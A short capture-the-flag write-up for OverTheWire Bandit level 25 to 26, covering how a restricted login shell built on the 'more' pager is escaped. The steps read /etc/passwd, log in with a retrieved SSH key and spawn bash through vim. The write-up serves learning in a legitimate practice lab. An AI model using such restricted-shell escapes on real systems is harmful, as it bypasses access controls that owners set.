# Bandit Level 25 → Level 26

## Goal
Access `bandit26`, whose login shell is replaced with a restricted program instead of a normal shell.

## Solution

1. Connected to the server using SSH: 
```
ssh -p 2220 bandit25@bandit.labs.overthewire.org
```
2. Identified that `bandit26` uses a custom shell:
```
cat /etc/passwd | grep bandit26
```
3. Found the shell script being used:
```
cat /usr/bin/showtext
```
It executes:
```
exec more ~/text.txt
```
4. Retrieved the SSH key for bandit26:
```
scp -P 2220 bandit25@bandit.labs.overthewire.org:/home/bandit25/bandit26.sshkey .
```
5. Logged in using the key:
```
ssh -i bandit26.sshkey -p 2220 bandit26@bandit.labs.overthewire.org
```
6. Exploited the `more` pager by making the terminal small so the output stopped, then used Vim to open a shell.
```
v
:set shell=/bin/bash
:shell
```

## Result
Gained an interactive shell as bandit26.

## Learning
- I learned that a user's login shell can be replaced with a program like `more`, which runs immediately after login and restricts access to a normal interactive shell.

- I learned that `vim` can be used to execute commands and spawn an interactive shell even inside restricted environments.
